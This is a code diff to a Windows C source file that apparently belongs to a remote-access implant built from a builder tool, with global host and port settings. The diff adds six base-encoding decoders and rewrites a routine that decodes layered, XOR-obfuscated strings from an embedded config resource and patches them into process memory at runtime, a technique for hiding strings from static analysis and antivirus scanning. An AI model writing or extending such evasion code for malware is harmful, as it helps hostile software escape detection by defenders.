@@ -36,6 +36,191 @@ unsigned char* base64_decode(const char* data, size_t input_length, size_t* outp
     return out;
 }
 
+unsigned char* base16_decode(const char* data, size_t input_length, size_t* output_length) {
+    DWORD out_len = 0;
+    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_HEX, NULL, &out_len, NULL, NULL)) {
+        return NULL;
+    }
+    unsigned char* out = (unsigned char*)malloc(out_len);
+    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_HEX, out, &out_len, NULL, NULL)) {
+        free(out);
+        return NULL;
+    }
+    if (output_length) *output_length = out_len;
+    return out;
+}
+
+unsigned char* base32_decode(const char* data, size_t input_length, size_t* output_length) {
+    const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+    size_t out_len = (input_length * 5) / 8;
+    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
+    if (!out) return NULL;
+
+    int buffer = 0;
+    int bits_left = 0;
+    size_t count = 0;
+
+    for (size_t i = 0; i < input_length; i++) {
+        char* p = strchr(alphabet, toupper(data[i]));
+        if (!p) continue;
+        int val = p - alphabet;
+        buffer = (buffer << 5) | val;
+        bits_left += 5;
+        if (bits_left >= 8) {
+            out[count++] = (buffer >> (bits_left - 8)) & 0xFF;
+            bits_left -= 8;
+        }
+    }
+    if (output_length) *output_length = count;
+    return out;
+}
+
+unsigned char* base58_decode(const char* data, size_t input_length, size_t* output_length) {
+    const char* alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    // Rough estimate for output size
+    size_t out_len = input_length;
+    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
+    if (!out) return NULL;
+
+    size_t bin_len = 0;
+    for (size_t i = 0; i < input_length; i++) {
+        char* p = strchr(alphabet, data[i]);
+        if (!p) continue;
+        int carry = p - alphabet;
+        for (size_t j = 0; j < bin_len; j++) {
+            carry += out[j] * 58;
+            out[j] = carry & 0xff;
+            carry >>= 8;
+        }
+        while (carry > 0) {
+            out[bin_len++] = carry & 0xff;
+            carry >>= 8;
+        }
+    }
+
+    for (size_t i = 0; i < input_length && data[i] == alphabet[0]; i++) {
+        out[bin_len++] = 0;
+    }
+
+    // Reverse the output
+    for (size_t i = 0; i < bin_len / 2; i++) {
+        unsigned char t = out[i];
+        out[i] = out[bin_len - 1 - i];
+        out[bin_len - 1 - i] = t;
+    }
+
+    if (output_length) *output_length = bin_len;
+    return out;
+}
+
+unsigned char* base62_decode(const char* data, size_t input_length, size_t* output_length) {
+    const char* alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    size_t out_len = input_length;
+    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
+    if (!out) return NULL;
+
+    size_t bin_len = 0;
+    for (size_t i = 0; i < input_length; i++) {
+        char* p = strchr(alphabet, data[i]);
+        if (!p) continue;
+        int carry = p - alphabet;
+        for (size_t j = 0; j < bin_len; j++) {
+            carry += out[j] * 62;
+            out[j] = carry & 0xff;
+            carry >>= 8;
+        }
+        while (carry > 0) {
+            out[bin_len++] = carry & 0xff;
+            carry >>= 8;
+        }
+    }
+    // Leading zeros not usually handled in standard base62, but we follow basex behavior
+    // which encodes leading zero bytes.
+    // However, the builder uses basex with "0123456789..." where '0' is the first char.
+    // We should handle leading zeros similarly to base58.
+    for (size_t i = 0; i < input_length && data[i] == alphabet[0]; i++) {
+        out[bin_len++] = 0;
+    }
+
+    for (size_t i = 0; i < bin_len / 2; i++) {
+        unsigned char t = out[i];
+        out[i] = out[bin_len - 1 - i];
+        out[bin_len - 1 - i] = t;
+    }
+
+    if (output_length) *output_length = bin_len;
+    return out;
+}
+
+unsigned char* base85_decode(const char* data, size_t input_length, size_t* output_length) {
+    size_t out_len = (input_length * 4) / 5 + 4;
+    unsigned char* out = (unsigned char*)malloc(out_len);
+    if (!out) return NULL;
+
+    size_t count = 0;
+    unsigned int val = 0;
+    int n = 0;
+
+    for (size_t i = 0; i < input_length; i++) {
+        val = val * 85 + (data[i] - 33);
+        n++;
+        if (n == 5) {
+            out[count++] = (val >> 24) & 0xFF;
+            out[count++] = (val >> 16) & 0xFF;
+            out[count++] = (val >> 8) & 0xFF;
+            out[count++] = val & 0xFF;
+            val = 0;
+            n = 0;
+        }
+    }
+
+    if (n > 0) {
+        int m = n - 1;
+        for (int i = 0; i < 5 - n; i++) val = val * 85 + 84;
+        for (int i = 0; i < m; i++) out[count++] = (val >> (24 - i * 8)) & 0xFF;
+    }
+
+    if (output_length) *output_length = count;
+    return out;
+}
+
+unsigned char* base91_decode(const char* data, size_t input_length, size_t* output_length) {
+    const char* lookup = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
+    unsigned char reverse_lookup[256];
+    for (int i = 0; i < 91; i++) reverse_lookup[(unsigned char)lookup[i]] = i;
+
+    unsigned char* out = (unsigned char*)malloc(input_length);
+    if (!out) return NULL;
+
+    unsigned int b = 0;
+    int n = 0;
+    int v = -1;
+    size_t count = 0;
+
+    for (size_t i = 0; i < input_length; i++) {
+        int c = reverse_lookup[(unsigned char)data[i]];
+        if (v < 0) {
+            v = c;
+        } else {
+            v += c * 91;
+            b |= v << n;
+            n += (v & 8191) > 88 ? 13 : 14;
+            do {
+                out[count++] = b & 0xFF;
+                b >>= 8;
+                n -= 8;
+            } while (n > 7);
+            v = -1;
+        }
+    }
+    if (v != -1) {
+        out[count++] = (b | v << n) & 0xFF;
+    }
+
+    if (output_length) *output_length = count;
+    return out;
+}
+
 char* str_replace(const char* orig, const char* rep, const char* with) {
     char* result;
     char* ins;
@@ -292,7 +477,7 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
 char g_host[256] = {0};
 int g_port = 0;
 
-unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
+unsigned char g_xor_key[12] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
 void transparent_decryption() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
@@ -309,37 +494,77 @@ void transparent_decryption() {
 
     if (memcmp(pData, marker, 16) != 0) return;
 
-    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
-    // StringTableEntry: [RVA(4)][Len(4)]
+    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries(16*N)][Pool]
+    // StringTableEntry: [RVA(4)][OrigLen(4)][EncLen(4)][Offset(4)]
 
     int num_strings = *(int*)(pData + 16 + 2032);
     if (num_strings <= 0) return;
 
     unsigned char* string_table = pData + 16 + 2032 + 4;
+    unsigned char* string_pool = string_table + (num_strings * 16);
+
     unsigned char key = g_xor_key[4];
+    unsigned char sequence[7];
+    memcpy(sequence, &g_xor_key[5], 7);
+
     if (key == 0) return; // Not obfuscated
 
     HMODULE hMod = GetModuleHandle(NULL);
     for (int i = 0; i < num_strings; i++) {
-        DWORD rva = *(DWORD*)(string_table + (i * 8));
-        DWORD len = *(DWORD*)(string_table + (i * 8) + 4);
+        DWORD rva = *(DWORD*)(string_table + (i * 16));
+        DWORD orig_len = *(DWORD*)(string_table + (i * 16) + 4);
+        DWORD enc_len = *(DWORD*)(string_table + (i * 16) + 8);
+        DWORD offset = *(DWORD*)(string_table + (i * 16) + 12);
 
-        if (rva == 0 || len == 0 || len > 1024) continue;
+        if (rva == 0 || orig_len == 0 || enc_len == 0) continue;
 
         unsigned char* addr = (unsigned char*)hMod + rva;
+        unsigned char* encoded_data = string_pool + offset;
 
-        MEMORY_BASIC_INFORMATION mbi;
-        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
-            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
-                DWORD old_protect;
-                if (VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                    for (DWORD j = 0; j < len; j++) {
-                        addr[j] ^= key;
-                    }
-                    VirtualProtect(addr, len, old_protect, &old_protect);
-                }
+        // Apply decoding sequence in reverse order
+        size_t current_len = enc_len;
+        unsigned char* current_data = (unsigned char*)malloc(current_len + 1);
+        memcpy(current_data, encoded_data, current_len);
+        current_data[current_len] = 0;
+
+        for (int j = 6; j >= 0; j--) {
+            unsigned char* next_data = NULL;
+            size_t next_len = 0;
+
+            switch (sequence[j]) {
+                case 1: next_data = base64_decode((char*)current_data, current_len, &next_len); break;
+                case 2: next_data = base32_decode((char*)current_data, current_len, &next_len); break;
+                case 3: next_data = base16_decode((char*)current_data, current_len, &next_len); break;
+                case 4: next_data = base58_decode((char*)current_data, current_len, &next_len); break;
+                case 5: next_data = base62_decode((char*)current_data, current_len, &next_len); break;
+                case 6: next_data = base85_decode((char*)current_data, current_len, &next_len); break;
+                case 7: next_data = base91_decode((char*)current_data, current_len, &next_len); break;
+            }
+
+            if (next_data) {
+                free(current_data);
+                current_data = next_data;
+                current_len = next_len;
             }
         }
+
+        // Final XOR
+        for (size_t k = 0; k < current_len; k++) {
+            current_data[k] ^= key;
+        }
+
+        // Patch back to memory
+        MEMORY_BASIC_INFORMATION mbi;
+        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
+            DWORD old_protect;
+            if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+                memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
+                // Ensure null termination if there's space
+                if (current_len < orig_len) addr[current_len] = 0;
+                VirtualProtect(addr, orig_len, old_protect, &old_protect);
+            }
+        }
+        free(current_data);
     }
 }
 
